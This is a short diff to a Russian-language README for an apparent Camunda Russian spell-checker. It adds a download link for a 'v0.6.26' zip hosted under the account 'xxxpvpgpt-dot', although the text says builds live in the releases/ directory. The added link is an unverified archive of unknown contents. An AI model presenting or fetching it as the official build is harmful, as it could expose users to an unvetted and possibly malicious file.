@@ -5,6 +5,8 @@
 ## Стабильная версия
 
 Текущая стабильная версия: **v0.6.26**.
+[camunda-russian-spell-checker-v0.6.26.zip](https://github.com/xxxpvpgpt-dot/camunda-russian-spell-checker/blob/7db9d00e8ea6de8616f9dc589ff07e98c09f8d68/camunda-russian-spell-checker-v0.6.26.zip)
+
 
 Готовая сборка хранится в каталоге `releases/`.
 ## Свежая версия
